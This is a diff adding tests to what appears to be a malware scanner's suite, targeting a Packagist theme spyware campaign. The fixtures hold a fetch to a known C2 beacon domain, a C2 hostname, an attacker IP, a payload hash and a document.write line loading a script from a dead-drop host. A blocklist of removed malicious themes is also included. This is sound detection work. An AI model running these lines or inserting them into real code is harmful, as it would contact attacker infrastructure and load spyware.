@@ -5740,4 +5740,118 @@ describe("Campaign Signatures", () => {
     });
   });
 
+  // =================================================================
+  // Packagist theme spyware chain (Socket, August 31 2026)
+  // =================================================================
+
+  describe("Packagist theme spyware chain (August 2026)", () => {
+    it("detects the cloudfareintcdn beacon host", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "loader.js"),
+        'fetch("https://www.cloudfareintcdn.com/wd-status.html");'
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      const finding = report.findings.find(
+        (f) => f.rule === "IOC_KNOWN_C2_DOMAIN"
+      );
+      expect(finding).toBeDefined();
+      expect(finding?.severity).toBe("critical");
+    });
+
+    it("detects an exfiltration C2 apex reached as a www host", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "exfil.js"),
+        'const c2 = "www.isbo31w1o7xk3fztvmgpbv.app";'
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      const finding = report.findings.find(
+        (f) => f.rule === "IOC_KNOWN_C2_DOMAIN"
+      );
+      expect(finding).toBeDefined();
+      expect(finding?.severity).toBe("critical");
+    });
+
+    it("detects the ad-fraud beacon IP", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "beacon.js"),
+        'const host = "23.225.48.20:4466";'
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      const finding = report.findings.find((f) => f.rule === "IOC_KNOWN_C2_IP");
+      expect(finding).toBeDefined();
+      expect(finding?.severity).toBe("critical");
+    });
+
+    it("detects the spyware payload hash", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "manifest.js"),
+        'const sha = "9d6b58886189c0e23f706c32d3d8dda97b0b6d927ece6de07270813f070295b5";'
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      const finding = report.findings.find(
+        (f) => f.rule === "IOC_KNOWN_MALWARE_HASH"
+      );
+      expect(finding).toBeDefined();
+      expect(finding?.severity).toBe("critical");
+    });
+
+    it("detects the first-stage loader dead drop", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "theme.js"),
+        'document.write("<script src=\\"https://union.macoms.la/jquery.min-3.6.8.js\\"></script>");'
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      const finding = report.findings.find(
+        (f) => f.rule === "IOC_KNOWN_DEAD_DROP"
+      );
+      expect(finding).toBeDefined();
+      expect(finding?.severity).toBe("critical");
+    });
+
+    // The thirteen theme names are blocked bare, which is only safe because every
+    // one of them is gone from Packagist. The vendor ophimcms is legitimate and
+    // still ships other themes, so the negative case is the one that matters.
+    it("blocks the removed themes without touching the vendor's live catalogue", () => {
+      const feed = getBundledFeed();
+      expect(
+        matchPackageIOC("composer", "ophimcms/theme-dy", "1.0.0", feed),
+        "a removed malicious theme must match at any version",
+      ).toBeTruthy();
+      expect(
+        matchPackageIOC("composer", "haiau009/kkphim-legend", undefined, feed),
+        "a removed malicious theme must match with no version given",
+      ).toBeTruthy();
+      expect(
+        matchPackageIOC("composer", "ophimcms/theme-toro", "1.0.0", feed),
+        "a live theme from the same legitimate vendor must never match",
+      ).toBeNull();
+      expect(
+        matchPackageIOC("composer", "ophimcms/theme-kiss", "1.0.0", feed),
+        "a live theme from the same legitimate vendor must never match",
+      ).toBeNull();
+    });
+
+    // The ad-fraud leg of the same write-up runs through shared commercial services.
+    // Those are deliberately absent from the blocklist; this pins that decision.
+    it("must NOT flag the shared ad and CDN hosts named in the same write-up", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "ads.js"),
+        'const a = "https://cdn1.ai/lib.js";\n' +
+          'const b = "https://yunray.ai/x";\n' +
+          'const c = "https://cre-ads.com/tag";\n'
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      expect(
+        report.findings.find((f) => f.rule === "IOC_KNOWN_C2_DOMAIN"),
+        "shared commercial hosts must never become indicators",
+      ).toBeUndefined();
+    });
+  });
+
 });
